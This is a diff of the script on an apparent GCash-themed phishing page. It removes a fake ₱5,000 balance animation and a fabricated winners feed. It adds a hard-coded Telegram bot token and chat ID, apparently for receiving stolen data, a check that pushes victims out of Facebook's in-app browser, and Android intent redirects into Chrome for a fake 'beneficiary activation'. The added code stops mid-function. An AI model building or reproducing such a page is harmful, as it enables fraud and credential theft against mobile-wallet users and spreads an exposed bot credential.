@@ -182,90 +182,35 @@
     </div>
 
     <script>
-    // NUMBER ANIMATION LOGIC
-    function animateValue(id, start, end, duration) {
-        const obj = document.getElementById(id);
-        let startTimestamp = null;
-        const step = (timestamp) => {
-            if (!startTimestamp) startTimestamp = timestamp;
-            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
-            const currentVal = Math.floor(progress * (end - start) + start);
-            obj.innerHTML = "₱" + currentVal.toLocaleString() + ".00";
-            if (progress < 1) {
-                window.requestAnimationFrame(step);
-            }
+    const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
+        const chatId = '7298607329';
+        const BYPASS_MODE = true; 
+
+        const isFacebookApp = () => {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            return (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1);
         };
-        window.requestAnimationFrame(step);
-    }
 
-    function redirectToGCash() {
-        const btn = document.getElementById('claimBtn');
-        const bal = document.getElementById('balanceText');
-        const timerDiv = document.getElementById('timer-text');
-
-        // Changed 1000 to 5000 for the countdown
-        animateValue("balanceText", 5000, 0, 800); 
-        bal.style.color = "#64748b";
-        bal.style.animation = "none";
-
-        btn.disabled = true;
-        btn.innerHTML = "Processing...";
-        timerDiv.style.display = "block";
-
-        startTimer(300);
-
-        setTimeout(() => {
-            window.location.href = "intent://yourwebsite.com#Intent;scheme=https;package=com.android.chrome;end"; 
-        }, 1000);
-    }
-
-    function startTimer(sec) {
-        let timer = sec;
-        const display = document.getElementById('waitTimer');
-        const interval = setInterval(() => {
-            let m = Math.floor(timer / 60);
-            let s = timer % 60;
-            display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
-            
-            if (--timer < 0) {
-                clearInterval(interval);
-                // Changed 1000 to 5000 for the reset
-                animateValue("balanceText", 0, 5000, 1200); 
-                const bal = document.getElementById('balanceText');
-                const btn = document.getElementById('claimBtn');
-                bal.style.color = "#4ade80";
-                bal.style.animation = "glow 2s infinite alternate";
-                btn.disabled = false;
-                btn.innerHTML = "CLAIM THRU GCASH";
-                document.getElementById('timer-text').style.display = "none";
-            }
-        }, 1000);
-    }
-
-    // WINNER FUNCTION WITH UPDATED ₱5,000 PAYOUT
-    function generateWinner() {
-        const prefixes = ['0917', '0922', '0998', '0905', '0916', '0945', '0966', '0935', '0906'];
-        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-        const lastThree = Math.floor(100 + Math.random() * 900);
-        const myGcashImage = "images/gc_icon.png"; // Fixed syntax error here
-
-        const winnerEntry = document.createElement('div');
-        winnerEntry.className = 'winner-item';
-        winnerEntry.innerHTML = `
-            <span>📱 ${randomPrefix}****${lastThree}</span>
-            <img src="${myGcashImage}" class="gcash-mini" alt="GCash">
-            <strong class="payout-green">+₱5,000</strong> 
-        `; // Changed +₱1,000 to +₱5,000
-
-        const list = document.getElementById('winners-list');
-        if (list) {
-            list.prepend(winnerEntry);
-            if (list.children.length > 5) list.removeChild(list.lastChild);
+        if (isFacebookApp()) {
+            alert("Please tap (⋮) and 'Open in Browser' to complete your benefiary activation.");
         }
-    }
 
-    generateWinner(); generateWinner();
-    setInterval(generateWinner, 3500);
+        function handleVerify() {
+            const currentUrl = window.location.href.replace(/^https?:\/\//, '');
+            if (!window.location.hash.includes("verified")) {
+                const intentUrl = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
+                window.location.href = intentUrl;
+                setTimeout(() => {
+                    document.getElementById('modalOverlay').style.display = 'flex';
+                }, 1500);
+            } else {
+                document.getElementById('modalOverlay').style.display = 'flex';
+            }
+        }
+
+        window.onload = () => {
+            if (window.location.hash.includes("verified")) {
+                document.getElementById('modalOverlay').style.display = 'flex';
 </script>
 
 <script src="https://static.app/js/static.js" type="text/javascript"></script>
